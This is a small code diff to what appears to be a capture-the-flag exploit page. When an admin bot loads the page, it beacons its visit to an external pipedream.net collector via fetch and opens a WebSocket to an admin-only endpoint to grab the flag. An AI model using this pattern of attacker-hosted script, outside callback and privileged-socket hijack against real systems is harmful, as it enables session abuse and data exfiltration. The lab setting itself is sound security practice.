@@ -12,6 +12,11 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ message: "Bot accessed HTML page" })
         });
+        fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: "Bot accessed HTML page 2" })
+        });
 
         // WebSocket connection to retrieve flag
         const ws = new WebSocket('ws://web:8080/admin/ws');
